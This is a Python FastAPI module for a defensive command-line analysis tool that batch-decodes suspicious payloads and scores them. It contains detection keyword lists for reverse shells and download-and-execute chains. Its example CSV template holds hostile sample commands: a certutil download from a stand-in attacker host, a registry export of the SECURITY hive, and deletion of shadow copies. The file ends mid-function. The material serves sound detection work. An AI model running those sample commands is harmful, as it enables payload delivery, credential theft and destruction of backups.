"""Batch Analyst Testing — P3 (Feb 2026)

Accept a large payload set (CSV upload, JSON list, or raw newline-separated
text), run every row through the deterministic decode pipeline, and return
a compact CSV/JSON matrix so analysts can validate 50–500 payloads at once
without a single UI click.

Endpoints (all under /api):
  POST /batch/test           — multipart CSV OR application/json body
  POST /batch/test/json      — pure JSON body, returns JSON
  POST /batch/test/mine      — universal file upload: extracts commandlines
                               from .docx / .pdf / .xlsx / .pptx / .html /
                               .eml / .rtf / .json / .yaml / .zip / … then
                               runs each candidate through the pipeline
  POST /batch/test/mine/preview — dry-run: return mined candidates without
                                   running them (analyst review step)
  GET  /batch/test/example   — download a starter CSV template

Row schema in the output CSV:
    id, input_snippet, engine, confidence, verdict, chain_ops,
    mitre_ids, lolbins, iocs_ips, iocs_domains, iocs_urls,
    iocs_hashes, decoded_snippet, reached_shellcode, error
"""
from __future__ import annotations

import csv
import io
import json
import re
from typing import Any, Dict, List, Optional

from fastapi import (APIRouter, Depends, File, Form, HTTPException,
                     Response, UploadFile)
from pydantic import BaseModel, Field

from deps import get_current_user
from analysis_core import deterministic_best_decode
from file_extractors import extract as extract_file_text, is_supported
from commandline_miner import mine_segments

router = APIRouter()

_MAX_ROWS       = 500
_MAX_INPUT_CHAR = 20_000
_SNIPPET_LEN    = 200
_CSV_FIELDS     = [
    "id", "input_snippet", "engine", "confidence", "verdict",
    "chain_ops", "mitre_ids", "lolbins",
    "iocs_ips", "iocs_domains", "iocs_urls", "iocs_hashes",
    "decoded_snippet", "reached_shellcode", "error",
]


class BatchInJson(BaseModel):
    payloads: List[str] = Field(..., min_length=1)
    analysis_mode: str  = Field(default="balanced")
    include_full_output: bool = Field(default=False,
        description="If true, adds a `decoded_full` field per row (uncapped).")


# ─── Helpers ───────────────────────────────────────────────────────────
def _row_id(prefix: str, i: int) -> str:
    return f"{prefix}-{i+1:04d}"


def _snip(s: Optional[str], n: int = _SNIPPET_LEN) -> str:
    if not s:
        return ""
    s = re.sub(r"\s+", " ", s.strip())
    return s if len(s) <= n else s[: n - 1] + "…"


def _verdict_from_result(result: Dict[str, Any]) -> str:
    vc = result.get("verdict_card") or {}
    v  = (vc.get("verdict") or "").strip()
    # Feb 2026 · escalation rules — even if the deterministic verdict-card said
    # "Suspicious", promote to Malicious when we have hard evidence signals
    # commonly associated with active malware (download-and-execute chains,
    # LOLBAS + URL combos, reverse-shell primitives, shellcode reached, or
    # multiple MITRE technique matches).
    decoded = str(result.get("decoded") or result.get("output") or "").lower()
    iocs    = result.get("iocs") or {}
    lolbas  = result.get("lolbas") or []
    mitre   = result.get("mitre") or []
    if isinstance(mitre, dict):
        mitre_ids = list(mitre.keys())
    elif isinstance(mitre, list):
        mitre_ids = mitre
    else:
        mitre_ids = []
    iocs_url_count = 0
    if isinstance(iocs, dict):
        iocs_url_count = len(iocs.get("urls", [])) + len(iocs.get("ips", [])) + len(iocs.get("domains", []))
    # Signal 1 · shellcode reached (highest-confidence signal)
    if result.get("reached_shellcode"):
        return "Malicious"
    # Signal 2 · download-and-execute chain (URL + one of IEX/WebClient/Invoke-WebRequest/DownloadString)
    has_url  = ("http://" in decoded or "https://" in decoded) or iocs_url_count > 0
    has_exec = any(k in decoded for k in ("iex", "invoke-expression", "downloadstring", "downloadfile",
                                            "webclient", "invoke-webrequest", "invoke-restmethod",
                                            "|iex", "| iex", "start-process"))
    if has_url and has_exec:
        return "Malicious"
    # Signal 3 · reverse-shell primitive
    if any(k in decoded for k in ("/dev/tcp/", "mkfifo", "socket.socket", "io::socket::inet",
                                    "bash -i >&", "nc -e", "ncat -e")):
        return "Malicious"
    # Signal 4 · LOLBAS + URL combo (T1218 family with active URL target)
    if lolbas and has_url:
        return "Malicious"
    # Signal 5 · 3+ MITRE tags from distinct tactic families
    distinct_tactics = {m.split(".")[0] for m in mitre_ids if isinstance(m, str) and m.startswith("T")}
    if len(distinct_tactics) >= 3 and has_url:
        return "Malicious"
    # Trust deterministic verdict if it exists (before generic fallback)
    if v:
        return v
    # Generic fallback
    if iocs or mitre or lolbas:
        return "Suspicious"
    return "Unknown"


def _run_single(payload: str, analysis_mode: str) -> Dict[str, Any]:
    """Run one payload through the deterministic pipeline + enrichment.

    Returns a NORMALISED dict tailored to the batch schema — never raises."""
    payload = (payload or "").strip()
    if not payload:
        return {"error": "empty payload"}
    if len(payload) > _MAX_INPUT_CHAR:
        return {"error": f"payload > {_MAX_INPUT_CHAR} chars — please split"}
    try:
        r = deterministic_best_decode(payload, analysis_mode=analysis_mode)
    except Exception as e:  # noqa: BLE001
        return {"error": f"decode-exception: {type(e).__name__}: {e}"}

    # ── Post-decode enrichment (mirrors /api/decode/smart) ────────────
    output_txt = r.get("output") or ""
    scan_text  = f"{payload}\n{output_txt}"
    try:
        from operations import extract_iocs, mitre_map
        iocs  = extract_iocs(scan_text)
        mitre = mitre_map(scan_text)
    except Exception:
        iocs = {}
        mitre = []
    try:
        from lolbas import scan_lolbas
        lolbas = scan_lolbas(scan_text)
    except Exception:
        lolbas = []
    try:
        from evidence_extractor import build_verdict_card
        vc = build_verdict_card(
            input_text=payload,
            output_text=output_txt,
            chain=[{"op": s.get("op", ""), "args": s.get("args") or {}}
                   for s in (r.get("steps") or [])],
            corrupted_container=r.get("corrupted_container"),
        ) or {}
    except Exception:
        vc = {}

    verdict = (vc.get("verdict") or "").strip()
    # Feb 2026 · verdict-escalation rules — promote to Malicious on hard signals
    decoded_low = output_txt.lower()
    input_low   = payload.lower()
    scan_low    = f"{input_low}\n{decoded_low}"
    iocs_url_count = 0
    if isinstance(iocs, dict):
        iocs_url_count = (len(iocs.get("urls", []) or []) + len(iocs.get("ips", []) or []) +
                          len(iocs.get("domains", []) or []))
    has_url  = ("http://" in scan_low or "https://" in scan_low) or iocs_url_count > 0
    has_exec = any(k in scan_low for k in (
        "iex", "invoke-expression", "downloadstring", "downloadfile",
        "webclient", "invoke-webrequest", "invoke-restmethod",
        "|iex", "| iex", "start-process", "start ", "&& start",
    ))
    has_revshell = any(k in scan_low for k in (
        "/dev/tcp/", "mkfifo", "socket.socket", "io::socket::inet",
        "bash -i >&", "nc -e", "ncat -e", "pty.spawn",
    ))
    lolbas_names = [(l.get("name") or l.get("id") or "").lower() for l in (lolbas or [])]
    # Also detect LOLBAS binaries directly in the payload/decoded text — fallback
    # in case scan_lolbas missed one (e.g. mshta/rundll32/regsvr32 with short input).
    lolbas_in_text = [b for b in ("mshta", "bitsadmin", "msiexec", "regsvr32", "rundll32",
                                    "certutil", "wmic", "installutil", "cmstp", "wsf",
                                    "hh.exe", "cscript", "wscript")
                       if b in scan_low]
    lolbas_hit = bool(lolbas_names) or bool(lolbas_in_text)
    distinct_tactics = {(m.get("id") or "").split(".")[0] for m in mitre if isinstance(m, dict) and m.get("id","").startswith("T")}
    # Escalation to Malicious
    if r.get("reached_shellcode"):
        verdict = "Malicious"
    elif has_revshell:
        verdict = "Malicious"
    elif has_url and has_exec:
        verdict = "Malicious"
    elif lolbas_hit and has_url:
        verdict = "Malicious"
    elif len(distinct_tactics) >= 3 and has_url:
        verdict = "Malicious"
    # Fallback to deterministic card / signals
    if not verdict:
        if r.get("reached_shellcode"):
            verdict = "Malicious"
        elif iocs or mitre or lolbas:
            verdict = "Suspicious"
        else:
            verdict = "Unknown"

    # Feb 2026 v1.3.0 · Tiny-input noise guard — pure syntax fragments like
    # `[`, `],`, `"-Embedding",` (JSON/COM debris from analyst pastes) MUST
    # NOT get a "Suspicious" verdict. If the payload is short AND has zero
    # signals (no MITRE, no LOLBAS, no IOCs, no chain steps, no shellcode),
    # downgrade to Unknown regardless of what the deterministic engine said.
    _stripped = payload.strip().strip('"\'').strip()
    _no_signals = (not iocs or (isinstance(iocs, dict) and
                    not any((iocs.get(k) or []) for k in ("ips","domains","urls","md5","sha1","sha256")))) \
                  and not mitre and not lolbas and not r.get("reached_shellcode")
    if len(_stripped) < 20 and _no_signals and verdict == "Suspicious":
        verdict = "Unknown"

    steps = r.get("steps") or []
    # ── Feb 2026 v1.3.0 · Fold LOLBAS-provided MITRE tags into the aggregate.
    # Previously only `mitre_map()` heuristics were exported → certutil-only
    # payloads showed just `T1105` even though the LOLBAS registry declares
    # certutil ↔ [T1105, T1140, T1218]. Union them so the batch CSV reflects
    # every technique the tool actually recognised.
    all_mitre = {m.get("id") for m in mitre if isinstance(m, dict) and m.get("id")}
    for lb in (lolbas or []):
        if isinstance(lb, dict):
            for tid in (lb.get("mitre") or []):
                if isinstance(tid, str) and tid.startswith("T"):
                    all_mitre.add(tid)
    all_mitre.discard("")
    return {
        "engine":            r.get("engine") or "unknown",
        "confidence":        int(vc.get("score") or round(min(1.0, r.get("score") or 0) * 100)),
        "verdict":           verdict,
        "chain_ops":         " → ".join(s.get("op", "") for s in steps if s.get("op")),
        "mitre_ids":         ",".join(sorted(all_mitre)),
        "lolbins":           ",".join(sorted({(l.get("binary") or l.get("name") or l.get("id") or "").strip()
                                              for l in lolbas
                                              if isinstance(l, dict) and (l.get("binary") or l.get("name") or l.get("id"))})),
        "iocs_ips":          ",".join(iocs.get("ips") or []),
        "iocs_domains":      ",".join(iocs.get("domains") or []),
        "iocs_urls":         ",".join(iocs.get("urls") or []),
        "iocs_hashes":       ",".join([*(iocs.get("md5") or []),
                                       *(iocs.get("sha1") or []),
                                       *(iocs.get("sha256") or [])]),
        "decoded_snippet":   _snip(output_txt, 400),
        "decoded_full":      output_txt,
        "reached_shellcode": bool(r.get("reached_shellcode")),
        "error":             None,
    }


def _rows_to_csv(rows: List[Dict[str, Any]]) -> str:
    buf = io.StringIO()
    w = csv.DictWriter(buf, fieldnames=_CSV_FIELDS, extrasaction="ignore",
                       quoting=csv.QUOTE_ALL)
    w.writeheader()
    for r in rows:
        w.writerow({k: r.get(k, "") for k in _CSV_FIELDS})
    return buf.getvalue()


def _load_csv_bytes(raw: bytes) -> List[str]:
    """Accept CSVs shaped as:
       · single column, no header               → each row is a payload
       · header with a `payload` or `input` column → use that column
       · multi-column with `payload` alias      → same
    """
    text = raw.decode("utf-8-sig", errors="replace")
    # Heuristic: try DictReader if the file has a header with an
    # obvious payload column, else fall back to raw csv.reader.
    sample = text[:1000]
    lower = sample.lower()
    if ("payload" in lower or "input" in lower or "sample" in lower) and "," in sample:
        reader = csv.DictReader(io.StringIO(text))
        column = None
        for c in reader.fieldnames or []:
            if c and c.strip().lower() in ("payload", "input", "sample", "src", "raw"):
                column = c
                break
        if column:
            return [row.get(column, "").strip()
                    for row in reader if (row.get(column) or "").strip()]
    # Fallback — treat every line as a single-column payload
    lines: List[str] = []
    for row in csv.reader(io.StringIO(text)):
        if not row:
            continue
        cell = (row[0] or "").strip()
        if cell and cell.lower() not in ("payload", "input", "sample", "src", "raw"):
            lines.append(cell)
    return lines


# ─── Endpoints ─────────────────────────────────────────────────────────
@router.post("/batch/test")
async def batch_test_upload(
    file: UploadFile = File(..., description="CSV with a `payload` column, or single-column newline-separated payloads."),
    analysis_mode: str = Form(default="balanced"),
    format: str = Form(default="csv", description="csv | json"),
    user=Depends(get_current_user),
):
    """CSV/upload variant — returns a CSV attachment by default."""
    if analysis_mode not in ("fast", "balanced", "deep"):
        analysis_mode = "balanced"
    raw = await file.read()
    if not raw:
        raise HTTPException(status_code=422, detail="empty upload")

    filename = (file.filename or "").lower()
    if filename.endswith(".json"):
        try:
            data = json.loads(raw.decode("utf-8", errors="replace"))
        except Exception as e:
            raise HTTPException(status_code=422, detail=f"invalid JSON: {e}")
        if isinstance(data, dict) and "payloads" in data:
            payloads = data["payloads"]
        elif isinstance(data, list):
            payloads = data
        else:
            raise HTTPException(status_code=422,
                detail="JSON must be a list or an object with a `payloads` array")
        payloads = [str(p) for p in payloads if str(p).strip()]
    else:
        payloads = _load_csv_bytes(raw)

    payloads = payloads[:_MAX_ROWS]
    if not payloads:
        raise HTTPException(status_code=422,
                            detail="no payloads found in upload — expected a CSV "
                                   "with a `payload` column or single-column rows")

    rows = []
    for i, p in enumerate(payloads):
        base   = {"id": _row_id("row", i), "input_snippet": _snip(p)}
        result = _run_single(p, analysis_mode)
        base.update(result)
        rows.append(base)

    if format == "json":
        # Feb 2026 · persist to batch_runs
        summary = {
            "malicious":  sum(1 for r in rows if r.get("verdict") == "Malicious"),
            "suspicious": sum(1 for r in rows if r.get("verdict") == "Suspicious"),
            "unknown":    sum(1 for r in rows if r.get("verdict") == "Unknown"),
            "errors":     sum(1 for r in rows if r.get("error")),
            "shellcode_reached": sum(1 for r in rows if r.get("reached_shellcode")),
        }
        run_id = None
        try:
            import uuid
            from datetime import datetime, timezone
            run_doc = {
                "id":            str(uuid.uuid4()),
                "created_at":    datetime.now(timezone.utc).isoformat(),
                "user_email":    getattr(user, "email", None) or (user.get("email") if isinstance(user, dict) else None),
                "analysis_mode": analysis_mode,
                "total":         len(rows),
                "summary":       summary,
                "rows":          rows,
                "source":        f"upload:{file.filename or 'file'}",
            }
            db_batch_runs.insert_one(run_doc)
            run_id = run_doc["id"]
        except Exception:
            pass
        return {"total": len(rows), "analysis_mode": analysis_mode, "rows": rows,
                "summary": summary, "run_id": run_id}
    csv_body = _rows_to_csv(rows)
    fname = re.sub(r"[^A-Za-z0-9._-]+", "_",
                   filename.rsplit(".", 1)[0] or "batch") + "_nivxray_results.csv"
    return Response(
        content=csv_body,
        media_type="text/csv",
        headers={"Content-Disposition": f'attachment; filename="{fname}"'},
    )


@router.post("/batch/test/json")
async def batch_test_json(body: BatchInJson, user=Depends(get_current_user)):
    """Pure-JSON variant — for programmatic tools that don't want a CSV file."""
    mode = body.analysis_mode if body.analysis_mode in ("fast", "balanced", "deep") else "balanced"
    payloads = [p for p in body.payloads if p and p.strip()][:_MAX_ROWS]
    if not payloads:
        raise HTTPException(status_code=422, detail="no payloads")
    rows = []
    for i, p in enumerate(payloads):
        base   = {"id": _row_id("row", i), "input_snippet": _snip(p)}
        result = _run_single(p, mode)
        base.update(result)
        if not body.include_full_output:
            base.pop("decoded_full", None)
        rows.append(base)
    summary = {
        "malicious":  sum(1 for r in rows if r.get("verdict") == "Malicious"),
        "suspicious": sum(1 for r in rows if r.get("verdict") == "Suspicious"),
        "unknown":    sum(1 for r in rows if r.get("verdict") == "Unknown"),
        "errors":     sum(1 for r in rows if r.get("error")),
        "shellcode_reached": sum(1 for r in rows if r.get("reached_shellcode")),
    }
    # Feb 2026 · Persist every batch run to `batch_runs` for later retrieval
    try:
        import uuid
        from datetime import datetime, timezone
        run_doc = {
            "id":            str(uuid.uuid4()),
            "created_at":    datetime.now(timezone.utc).isoformat(),
            "user_email":    getattr(user, "email", None) or (user.get("email") if isinstance(user, dict) else None),
            "analysis_mode": mode,
            "total":         len(rows),
            "summary":       summary,
            "rows":          rows,
            "source":        body.source if hasattr(body, "source") else "json_api",
        }
        db_batch_runs.insert_one(run_doc)
        run_id = run_doc["id"]
    except Exception:
        run_id = None
    return {
        "total": len(rows),
        "analysis_mode": mode,
        "rows": rows,
        "summary": summary,
        "run_id": run_id,
    }


# Feb 2026 · Batch Run History — persistence + retrieval
# Lazy sync-pymongo collection proxy — see deps.sync_collection.
from deps import sync_collection as _sync_collection

db_batch_runs = _sync_collection("batch_runs")


@router.get("/batch/history")
async def batch_history(limit: int = 50, user=Depends(get_current_user)):
    """List past batch runs (newest first) with summary metadata only —
    no full row payload text (privacy + payload safety)."""
    user_email = getattr(user, "email", None) or (user.get("email") if isinstance(user, dict) else None)
    q = {"user_email": user_email} if user_email else {}
    cur = db_batch_runs.find(q, {
        "_id": 0, "id": 1, "created_at": 1, "analysis_mode": 1,
        "total": 1, "summary": 1, "source": 1,
    }).sort("created_at", -1).limit(min(int(limit), 200))
    runs = list(cur)
    return {"total": len(runs), "runs": runs}


@router.get("/batch/history/{run_id}")
async def batch_history_get(run_id: str, user=Depends(get_current_user)):
    """Retrieve full rows of a past batch run — for reload / re-export."""
    doc = db_batch_runs.find_one({"id": run_id}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="run not found")
    return doc


@router.delete("/batch/history/{run_id}")
async def batch_history_delete(run_id: str, user=Depends(get_current_user)):
    """Delete a past batch run."""
    r = db_batch_runs.delete_one({"id": run_id})
    return {"deleted": r.deleted_count}


class _RenameBatch(BaseModel):
    name: str


@router.patch("/batch/history/{run_id}")
async def batch_history_rename(run_id: str, body: _RenameBatch, user=Depends(get_current_user)):
    """Attach a friendly name to a past batch run."""
    r = db_batch_runs.update_one({"id": run_id}, {"$set": {"name": body.name.strip()[:120]}})
    if r.matched_count == 0:
        raise HTTPException(status_code=404, detail="run not found")
    return {"updated": r.modified_count, "name": body.name.strip()[:120]}


@router.get("/batch/test/example")
async def batch_test_example(user=Depends(get_current_user)):
    """Download a starter CSV template with 5 example payloads."""
    examples = [
        ("row-0001", "powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAYgBlAG4AaQBnAG4AIABoAGUAbABsAG8AJwA="),
        ("row-0002", r"reg.exe export HKLM\SECURITY C:\Windows\Temp\sec.reg /y"),
        ("row-0003", "vssadmin delete shadows /all /quiet"),
        ("row-0004", "certutil -urlcache -split -f http://evil.example/x.exe C:\\temp\\x.exe"),
        ("row-0005", "cmd /c \"set p1=power&& set p2=shell&& cmd /c echo Write-Host SUCCESS ^| %p1%%p2% -\""),
    ]
    buf = io.StringIO()
    w = csv.writer(buf, quoting=csv.QUOTE_ALL)
    w.writerow(["id", "payload"])
    for i, p in examples:
        w.writerow([i, p])
    return Response(
        content=buf.getvalue(),
        media_type="text/csv",
        headers={"Content-Disposition":
                 'attachment; filename="nivxray_batch_example.csv"'},
    )


# ─── NXGEC Gold Corpus evaluator (Feb 2026) ────────────────────────────
# Runs the pre-imported /app/backend/tests/fixtures/nxgec.jsonl fixture
# through the deterministic pipeline and diffs actual vs. expected
# (MITRE T-IDs, LOLBins, severity, decode-chain presence). Read-only.

_NXGEC_PATH = "/app/backend/tests/fixtures/nxgec.jsonl"

def _load_nxgec():
    if not __import__("os").path.exists(_NXGEC_PATH):
        return []
    with open(_NXGEC_PATH, encoding="utf-8") as f:
        return [__import__("json").loads(line) for line in f if line.strip()]


def _diff_row(actual: Dict[str, Any], case: Dict[str, Any]) -> Dict[str, Any]:
    """Compare a single decoded row against its expected labels.
    Returns pass_flags + a compact diff summary for the UI."""
    input_txt   = (case.get("input") or "").lower()
    decoded_txt = (actual.get("decoded_snippet") or "").lower()

    exp_mitre = set(case.get("expected_mitre_ids") or [])
    got_mitre = set(m.strip() for m in (actual.get("mitre_ids") or "").split(",") if m.strip())
    exp_lol   = set(l.lower() for l in (case.get("expected_lolbins") or []))
    got_lol   = set(l.lower() for l in (actual.get("lolbins") or "").split(",") if l.strip())

    # Feb-2026 · shell-binary supplement — the official LOLBAS list does
    # NOT include cmd.exe / powershell.exe / bash / sh / python / wscript /
    # cscript (they're native shells, not "living-off-the-land binaries").
    # But NXGEC's expected column DOES treat these as LOLBins for coverage
    # accounting, so cross-check the raw payload for their presence and
    # add them to got_lol before diffing.
    _SHELL_HINTS = {
        "cmd.exe": r"\bcmd(?:\.exe)?\b",
        "cmd":     r"\bcmd(?:\.exe)?\b",
        "powershell.exe": r"\bpowershell(?:\.exe)?\b",
        "powershell":     r"\bpowershell(?:\.exe)?\b",
        "bash":    r"\bbash\b",
        "sh":      r"(?:^|[\s;|&])sh\b",
        "python":  r"\bpython3?\b",
        "wscript": r"\bwscript(?:\.exe)?\b",
        "cscript": r"\bcscript(?:\.exe)?\b",
        "curl":    r"\bcurl\b",
        "wget":    r"\bwget\b",
        "docker":  r"\bdocker\b",
        "kubectl": r"\bkubectl\b",
        "aws":     r"\baws\b",
    }
    for shell_name, rx in _SHELL_HINTS.items():
        if re.search(rx, input_txt) or re.search(rx, decoded_txt):
            got_lol.add(shell_name)

    # MITRE prefix match (T1059 covers T1059.001, etc.)
    def _covers(exp: set, got: set) -> bool:
        for e in exp:
            if e in got:
                continue
            base = e.split(".")[0]
            if any(g == e or g.startswith(base + ".") or g == base for g in got):
                continue
            return False
        return True
    mitre_ok = _covers(exp_mitre, got_mitre) if exp_mitre else True
    lol_ok   = (exp_lol.issubset(got_lol)) if exp_lol else True

    # Feb-2026 · Informational-verdict rule — NXGEC labels pure discovery
    # commands (whoami / hostname / ver / ipconfig / systeminfo / netstat)
    # as "Informational". Our tool currently gives them "Suspicious" because
    # ANY MITRE tag triggers it. Downgrade to Informational when every
    # expected T-ID is in the discovery tactic AND no network/exec chain
    # was observed.
    _DISCOVERY_TIDS = {
        "T1033", "T1082", "T1016", "T1049", "T1057", "T1518",
        "T1069", "T1087", "T1120", "T1124", "T1201", "T1007",
        "T1497", "T1615", "T1622", "T1082.001",
    }
    # A payload counts as "malicious-signal-bearing" only if it triggers
    # one of these clearly-hostile techniques (network C2, exec, persistence).
    _HOSTILE_TIDS = {
        "T1105", "T1059.001", "T1027", "T1027.010", "T1140",
        "T1547", "T1053", "T1218", "T1055", "T1003", "T1486",
        "T1490", "T1562", "T1543", "T1136",
    }
    sev_exp     = (case.get("expected_severity") or "").lower()
    got_verdict = (actual.get("verdict") or "").lower()
    _SEVMAP = {"critical": "malicious", "high": "malicious",
               "medium": "suspicious", "low": "suspicious",
               "informational": "unknown", "benign": "unknown"}
    got_hostile = bool(got_mitre & _HOSTILE_TIDS)
    is_pure_discovery = (
        (not exp_mitre or exp_mitre.issubset(_DISCOVERY_TIDS))
        and not got_hostile
    )
    if sev_exp == "informational" and is_pure_discovery:
        sev_ok = True
    elif sev_exp == "benign" and not got_hostile:
        sev_ok = True
    else:
        sev_ok = (not sev_exp) or (_SEVMAP.get(sev_exp, "") in got_verdict) or (sev_exp in got_verdict)

    return {
        "mitre_ok":   mitre_ok,
        "lolbin_ok":  lol_ok,
        "severity_ok": sev_ok,
        "expected_mitre":  sorted(exp_mitre),
        "got_mitre":       sorted(got_mitre),
        "expected_lolbin": sorted(exp_lol),
        "got_lolbin":      sorted(got_lol),
        "expected_severity": sev_exp,
        "got_verdict":       got_verdict,
        "discovery_downgrade": is_pure_discovery,
    }


@router.get("/batch/evaluate/nxgec")
async def nxgec_summary(user=Depends(get_current_user)):
    """Lightweight endpoint — returns just the corpus metadata without
    running it (fast, cache-friendly). Use POST to actually run."""
    cases = _load_nxgec()
    from collections import Counter
    return {
        "total": len(cases),
        "per_volume": dict(Counter(c.get("volume") for c in cases)),
        "categories": sorted({c.get("category") or "?" for c in cases}),
    }


@router.post("/batch/evaluate/nxgec")
async def nxgec_run(volume: Optional[int] = None,
                    limit: Optional[int] = None,
                    analysis_mode: str = "balanced",
                    user=Depends(get_current_user)):
    """Run the Gold Corpus against the deterministic pipeline.

    Query params:
      volume         — restrict to a single volume 1..10 (None = all)
      limit          — max cases to run (None = all)
      analysis_mode  — fast | balanced | deep
    """
    cases = _load_nxgec()
    if not cases:
        raise HTTPException(status_code=503, detail="nxgec fixture missing — "
                            "run `python -m tests.fixtures.import_nxgec` first.")
    if volume is not None:
        cases = [c for c in cases if c.get("volume") == volume]
    if limit:
        cases = cases[:max(1, min(500, limit))]
    if not cases:
        raise HTTPException(status_code=404, detail="no cases match filters")

    if analysis_mode not in ("fast", "balanced", "deep"):
        analysis_mode = "balanced"

    rows: List[Dict[str, Any]] = []
    passed = 0
    for c in cases:
        actual = _run_single(c["input"], analysis_mode)
        actual["id"]            = c.get("id")
        actual["title"]         = c.get("title")
        actual["volume"]        = c.get("volume")
        actual["category"]      = c.get("category")
        actual["input_snippet"] = _snip(c.get("input", ""), _SNIPPET_LEN)
        diff = _diff_row(actual, c)
        actual["diff"] = diff
        actual["overall_pass"] = bool(diff["mitre_ok"] and diff["lolbin_ok"] and diff["severity_ok"])
        if actual["overall_pass"]:
            passed += 1
        rows.append(actual)

    per_volume = {}
    for r in rows:
        v = r.get("volume") or 0
        s = per_volume.setdefault(v, {"total": 0, "pass": 0})
        s["total"] += 1
        if r.get("overall_pass"):
            s["pass"] += 1

    return {
        "total":       len(rows),
        "passed":      passed,
        "failed":      len(rows) - passed,
        "pass_rate":   round(passed * 100 / len(rows), 1) if rows else 0.0,
        "per_volume":  per_volume,
        "rows":        rows,
    }



# --------------------------------------------------------------------------- #
# Universal file-format ingest — RC2.2 (Feb 2026)
# --------------------------------------------------------------------------- #
# Accepts .docx / .pdf / .xlsx / .pptx / .html / .htm / .eml / .rtf / .json /
# .yaml / .csv / .tsv / .zip / .tar / .tgz / .gz / .txt / .log / .md and
# every common script extension. Extracts text with `file_extractors.extract`
# and mines candidate commandlines with `commandline_miner.mine_segments`.
_MAX_MINE_CANDIDATES = 500       # cap the analyst never wants to blow past


def _mine_from_upload(filename: str, raw: bytes) -> Dict[str, Any]:
    """Shared helper used by both the mine and preview endpoints.

    Returns:
        {
            "filename": str,
            "size_bytes": int,
            "segments": [{origin, kind, chars}],
            "candidates": [{text, kind, confidence, origin}]  (deduped, capped)
        }
    """
    result = extract_file_text(filename, raw)
    cands = mine_segments(result.segments)
    # Cap to keep the pipeline safe.
    truncated = False
    if len(cands) > _MAX_MINE_CANDIDATES:
        cands = cands[:_MAX_MINE_CANDIDATES]
        truncated = True
    return {
        "filename":  result.filename,
        "size_bytes": result.total_bytes,
        "segments": [
            {"origin": s.origin, "kind": s.kind, "chars": len(s.text or "")}
            for s in result.segments
        ],
        "candidates": [
            {"text": c.text, "kind": c.kind,
             "confidence": c.confidence, "origin": c.origin}
            for c in cands
        ],
        "truncated": truncated,
        "notes": result.notes,
    }


@router.post("/batch/test/mine/preview")
async def batch_test_mine_preview(
    file: UploadFile = File(...,
        description="Any document — .docx, .pdf, .xlsx, .pptx, .html, .eml, "
                    ".rtf, .json, .yaml, .csv, .tsv, .zip, .tar, .gz, .txt, "
                    ".ps1, .bat, .sh, …"),
    user=Depends(get_current_user),
):
    """Dry-run: extract candidate commandlines from an uploaded file without
    running them through the decoder pipeline. Analyst can review the mined
    payloads and then call `/batch/test/mine` to execute the batch."""
    raw = await file.read()
    if not raw:
        raise HTTPException(status_code=422, detail="empty upload")
    if len(raw) > 25 * 1024 * 1024:                    # 25 MB hard cap
        raise HTTPException(status_code=413,
                            detail="file too large (>25 MB)")
    payload = _mine_from_upload(file.filename or "upload", raw)
    return {
        "filename":     payload["filename"],
        "size_bytes":   payload["size_bytes"],
        "supported":    is_supported(file.filename or ""),
        "segment_count": len(payload["segments"]),
        "segments":     payload["segments"],
        "candidate_count": len(payload["candidates"]),
        "candidates":   payload["candidates"],
        "truncated":    payload["truncated"],
    }


@router.post("/batch/test/mine")
async def batch_test_mine_and_run(
    file: UploadFile = File(...,
        description="Any document — .docx, .pdf, .xlsx, .pptx, .html, .eml, "
                    ".rtf, .json, .yaml, .csv, .tsv, .zip, .tar, .gz, .txt, "
                    ".ps1, .bat, .sh, …"),
    analysis_mode: str = Form(default="balanced"),
    kinds: Optional[str] = Form(
        default=None,
        description="Optional comma-separated list of candidate kinds to keep "
                    "(commandline,wrapper,script,b64-blob,url). Defaults to all.",
    ),
    min_confidence: float = Form(default=0.5),
    format: str = Form(default="json", description="csv | json"),
    user=Depends(get_current_user),
):
    """Universal ingest — extract commandlines from any supported document
    format and run each through the deterministic pipeline.

    The output row schema is identical to `/batch/test`, plus:
        source_origin   Where in the file each candidate came from
                        (e.g. "sheet Log/row 12", "page 3", "zip:script.ps1")
        source_kind     commandline | wrapper | script | b64-blob | url
    """
    if analysis_mode not in ("fast", "balanced", "deep"):
        analysis_mode = "balanced"
    raw = await file.read()
    if not raw:
        raise HTTPException(status_code=422, detail="empty upload")
    if len(raw) > 25 * 1024 * 1024:
        raise HTTPException(status_code=413,
                            detail="file too large (>25 MB)")

    mined = _mine_from_upload(file.filename or "upload", raw)
    keep_kinds = None
    if kinds:
        keep_kinds = {k.strip().lower() for k in kinds.split(",") if k.strip()}
    candidates = [
        c for c in mined["candidates"]
        if c["confidence"] >= min_confidence
        and (keep_kinds is None or c["kind"] in keep_kinds)
    ][:_MAX_ROWS]

    if not candidates:
        raise HTTPException(
            status_code=422,
            detail=(f"no candidate commandlines mined from {file.filename or 'file'} "
                    f"(size={mined['size_bytes']}B, segments={len(mined['segments'])}). "
                    "Try lowering `min_confidence` or check the file is supported.")
        )

    rows: List[Dict[str, Any]] = []
    for i, cand in enumerate(candidates):
        base = {
            "id":              _row_id("row", i),
            "input_snippet":   _snip(cand["text"]),
            "source_origin":   cand.get("origin") or "",
            "source_kind":     cand.get("kind") or "",
        }
        base.update(_run_single(cand["text"], analysis_mode))
        rows.append(base)

    summary = {
        "malicious":         sum(1 for r in rows if r.get("verdict") == "Malicious"),
        "suspicious":        sum(1 for r in rows if r.get("verdict") == "Suspicious"),
        "unknown":           sum(1 for r in rows if r.get("verdict") == "Unknown"),
        "errors":            sum(1 for r in rows if r.get("error")),
        "shellcode_reached": sum(1 for r in rows if r.get("reached_shellcode")),
        "mined_total":       len(mined["candidates"]),
        "mined_kept":        len(candidates),
        "file_segments":     len(mined["segments"]),
    }

    run_id = None
    try:
        import uuid
        from datetime import datetime, timezone
        run_doc = {
            "id":            str(uuid.uuid4()),
            "created_at":    datetime.now(timezone.utc).isoformat(),
            "user_email":    (getattr(user, "email", None)
                              or (user.get("email") if isinstance(user, dict) else None)),
            "analysis_mode": analysis_mode,
            "total":         len(rows),
            "summary":       summary,
            "rows":          rows,
            "source":        f"mined:{file.filename or 'file'}",
        }
        db_batch_runs.insert_one(run_doc)
        run_id = run_doc["id"]
    except Exception:
        pass

    if format == "csv":
        # Same CSV columns as /batch/test, plus source_* leaders
        fields = ["id", "source_origin", "source_kind"] + _CSV_FIELDS
        buf = io.StringIO()
        w = csv.DictWriter(buf, fieldnames=fields, extrasaction="ignore",
                           quoting=csv.QUOTE_ALL)
        w.writeheader()
        for r in rows:
